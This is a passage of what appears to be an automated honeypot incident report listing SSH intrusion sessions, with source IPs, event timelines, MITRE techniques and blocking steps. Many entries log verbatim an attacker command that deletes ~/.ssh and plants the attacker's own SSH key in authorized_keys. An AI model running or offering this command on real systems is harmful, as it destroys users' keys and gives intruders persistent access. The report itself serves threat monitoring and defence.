| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:15:51` | `cowrie.session.connect` |
| `2026-06-08 13:15:51` | `cowrie.client.version` |
| `2026-06-08 13:15:51` | `cowrie.client.kex` |
| `2026-06-08 13:15:52` | `cowrie.login.success` |
| `2026-06-08 13:15:53` | `cowrie.session.params` |
| `2026-06-08 13:15:53` | `cowrie.command.input` |
| `2026-06-08 13:15:53` | `cowrie.command.failed` |
| `2026-06-08 13:15:53` | `cowrie.log.closed` |
| `2026-06-08 13:15:54` | `cowrie.session.params` |
| `2026-06-08 13:15:54` | `cowrie.command.input` |
| `2026-06-08 13:15:54` | `cowrie.session.file_download` |
| `2026-06-08 13:15:54` | `cowrie.log.closed` |
| `2026-06-08 13:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80f5d925ca6

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:15 |
| **Last Seen** | 2026-06-08 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:15:57` | `cowrie.session.connect` |
| `2026-06-08 13:15:57` | `cowrie.client.version` |
| `2026-06-08 13:15:57` | `cowrie.client.kex` |
| `2026-06-08 13:15:58` | `cowrie.login.success` |
| `2026-06-08 13:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efa9ee754c5

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:16 |
| **Last Seen** | 2026-06-08 13:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:16:29` | `cowrie.session.connect` |
| `2026-06-08 13:16:29` | `cowrie.client.version` |
| `2026-06-08 13:16:30` | `cowrie.client.kex` |
| `2026-06-08 13:16:30` | `cowrie.login.success` |
| `2026-06-08 13:16:30` | `cowrie.session.params` |
| `2026-06-08 13:16:30` | `cowrie.command.input` |
| `2026-06-08 13:16:30` | `cowrie.command.failed` |
| `2026-06-08 13:16:31` | `cowrie.log.closed` |
| `2026-06-08 13:16:31` | `cowrie.session.params` |
| `2026-06-08 13:16:31` | `cowrie.command.input` |
| `2026-06-08 13:16:31` | `cowrie.session.file_download` |
| `2026-06-08 13:16:31` | `cowrie.log.closed` |
| `2026-06-08 13:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6563d5d41132

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:16 |
| **Last Seen** | 2026-06-08 13:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:16:33` | `cowrie.session.connect` |
| `2026-06-08 13:16:33` | `cowrie.client.version` |
| `2026-06-08 13:16:33` | `cowrie.client.kex` |
| `2026-06-08 13:16:34` | `cowrie.login.success` |
| `2026-06-08 13:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2028eb99b02

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:17 |
| **Last Seen** | 2026-06-08 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:17:49` | `cowrie.session.connect` |
| `2026-06-08 13:17:49` | `cowrie.client.version` |
| `2026-06-08 13:17:49` | `cowrie.client.kex` |
| `2026-06-08 13:17:49` | `cowrie.login.success` |
| `2026-06-08 13:17:49` | `cowrie.session.params` |
| `2026-06-08 13:17:49` | `cowrie.command.input` |
| `2026-06-08 13:17:49` | `cowrie.command.failed` |
| `2026-06-08 13:17:49` | `cowrie.log.closed` |
| `2026-06-08 13:17:49` | `cowrie.session.params` |
| `2026-06-08 13:17:49` | `cowrie.command.input` |
| `2026-06-08 13:17:49` | `cowrie.session.file_download` |
| `2026-06-08 13:17:49` | `cowrie.log.closed` |
| `2026-06-08 13:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f78fcc3e56ab

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:17 |
| **Last Seen** | 2026-06-08 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:17:51` | `cowrie.session.connect` |
| `2026-06-08 13:17:51` | `cowrie.client.version` |
| `2026-06-08 13:17:51` | `cowrie.client.kex` |
| `2026-06-08 13:17:51` | `cowrie.login.success` |
| `2026-06-08 13:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa350cfd55a

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:19 |
| **Last Seen** | 2026-06-08 13:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:19:50` | `cowrie.session.connect` |
| `2026-06-08 13:19:50` | `cowrie.client.version` |
| `2026-06-08 13:19:51` | `cowrie.client.kex` |
| `2026-06-08 13:19:51` | `cowrie.login.success` |
| `2026-06-08 13:19:51` | `cowrie.session.params` |
| `2026-06-08 13:19:51` | `cowrie.command.input` |
| `2026-06-08 13:19:51` | `cowrie.command.failed` |
| `2026-06-08 13:19:51` | `cowrie.log.closed` |
| `2026-06-08 13:19:51` | `cowrie.session.params` |
| `2026-06-08 13:19:51` | `cowrie.command.input` |
| `2026-06-08 13:19:51` | `cowrie.session.file_download` |
| `2026-06-08 13:19:51` | `cowrie.log.closed` |
| `2026-06-08 13:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4184e1c3c5c

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:19 |
| **Last Seen** | 2026-06-08 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:19:52` | `cowrie.session.connect` |
| `2026-06-08 13:19:53` | `cowrie.client.version` |
| `2026-06-08 13:19:53` | `cowrie.client.kex` |
| `2026-06-08 13:19:53` | `cowrie.login.success` |
| `2026-06-08 13:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8b3aec02f7

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:20 |
| **Last Seen** | 2026-06-08 13:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:20:48` | `cowrie.session.connect` |
| `2026-06-08 13:20:48` | `cowrie.client.version` |
| `2026-06-08 13:20:49` | `cowrie.client.kex` |
| `2026-06-08 13:20:50` | `cowrie.login.success` |
| `2026-06-08 13:20:50` | `cowrie.session.params` |
| `2026-06-08 13:20:50` | `cowrie.command.input` |
| `2026-06-08 13:20:50` | `cowrie.command.failed` |
| `2026-06-08 13:20:51` | `cowrie.log.closed` |
| `2026-06-08 13:20:51` | `cowrie.session.params` |
| `2026-06-08 13:20:51` | `cowrie.command.input` |
| `2026-06-08 13:20:51` | `cowrie.session.file_download` |
| `2026-06-08 13:20:51` | `cowrie.log.closed` |
| `2026-06-08 13:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e649d9acc5

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:20 |
| **Last Seen** | 2026-06-08 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:20:54` | `cowrie.session.connect` |
| `2026-06-08 13:20:54` | `cowrie.client.version` |
| `2026-06-08 13:20:54` | `cowrie.client.kex` |
| `2026-06-08 13:20:55` | `cowrie.login.success` |
| `2026-06-08 13:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48422a3b1dd

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:21 |
| **Last Seen** | 2026-06-08 13:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:21:26` | `cowrie.session.connect` |
| `2026-06-08 13:21:26` | `cowrie.client.version` |
| `2026-06-08 13:21:27` | `cowrie.client.kex` |
| `2026-06-08 13:21:28` | `cowrie.login.success` |
| `2026-06-08 13:21:29` | `cowrie.session.params` |
| `2026-06-08 13:21:29` | `cowrie.command.input` |
| `2026-06-08 13:21:29` | `cowrie.command.failed` |
| `2026-06-08 13:21:29` | `cowrie.log.closed` |
| `2026-06-08 13:21:30` | `cowrie.session.params` |
| `2026-06-08 13:21:30` | `cowrie.command.input` |
| `2026-06-08 13:21:30` | `cowrie.session.file_download` |
| `2026-06-08 13:21:30` | `cowrie.log.closed` |
| `2026-06-08 13:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af26a197cb4a

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:21 |
| **Last Seen** | 2026-06-08 13:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:21:34` | `cowrie.session.connect` |
| `2026-06-08 13:21:34` | `cowrie.client.version` |
| `2026-06-08 13:21:34` | `cowrie.client.kex` |
| `2026-06-08 13:21:36` | `cowrie.login.success` |
| `2026-06-08 13:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e987f9fac4

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:23 |
| **Last Seen** | 2026-06-08 13:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:23:49` | `cowrie.session.connect` |
| `2026-06-08 13:23:49` | `cowrie.client.version` |
| `2026-06-08 13:23:49` | `cowrie.client.kex` |
| `2026-06-08 13:23:50` | `cowrie.login.success` |
| `2026-06-08 13:23:50` | `cowrie.session.params` |
| `2026-06-08 13:23:50` | `cowrie.command.input` |
| `2026-06-08 13:23:50` | `cowrie.command.failed` |
| `2026-06-08 13:23:50` | `cowrie.log.closed` |
| `2026-06-08 13:23:50` | `cowrie.session.params` |
| `2026-06-08 13:23:50` | `cowrie.command.input` |
| `2026-06-08 13:23:50` | `cowrie.session.file_download` |
| `2026-06-08 13:23:50` | `cowrie.log.closed` |
| `2026-06-08 13:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff0562324a4

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:23 |
| **Last Seen** | 2026-06-08 13:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:23:51` | `cowrie.session.connect` |
| `2026-06-08 13:23:51` | `cowrie.client.version` |
| `2026-06-08 13:23:51` | `cowrie.client.kex` |
| `2026-06-08 13:23:51` | `cowrie.login.success` |
| `2026-06-08 13:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e433b4b6b3

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:24 |
| **Last Seen** | 2026-06-08 13:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:24:47` | `cowrie.session.connect` |
| `2026-06-08 13:24:47` | `cowrie.client.version` |
| `2026-06-08 13:24:47` | `cowrie.client.kex` |
| `2026-06-08 13:24:49` | `cowrie.login.success` |
| `2026-06-08 13:24:50` | `cowrie.session.params` |
| `2026-06-08 13:24:50` | `cowrie.command.input` |
| `2026-06-08 13:24:50` | `cowrie.command.failed` |
| `2026-06-08 13:24:50` | `cowrie.log.closed` |
| `2026-06-08 13:24:51` | `cowrie.session.params` |
| `2026-06-08 13:24:51` | `cowrie.command.input` |
| `2026-06-08 13:24:51` | `cowrie.session.file_download` |
| `2026-06-08 13:24:51` | `cowrie.log.closed` |
| `2026-06-08 13:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37d71bc08ec

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:24 |
| **Last Seen** | 2026-06-08 13:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:24:55` | `cowrie.session.connect` |
| `2026-06-08 13:24:55` | `cowrie.client.version` |
| `2026-06-08 13:24:55` | `cowrie.client.kex` |
| `2026-06-08 13:24:56` | `cowrie.login.success` |
| `2026-06-08 13:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1d506863fe0

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:25 |
| **Last Seen** | 2026-06-08 13:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:25:47` | `cowrie.session.connect` |
| `2026-06-08 13:25:47` | `cowrie.client.version` |
| `2026-06-08 13:25:47` | `cowrie.client.kex` |
| `2026-06-08 13:25:48` | `cowrie.login.success` |
| `2026-06-08 13:25:48` | `cowrie.session.params` |
| `2026-06-08 13:25:48` | `cowrie.command.input` |
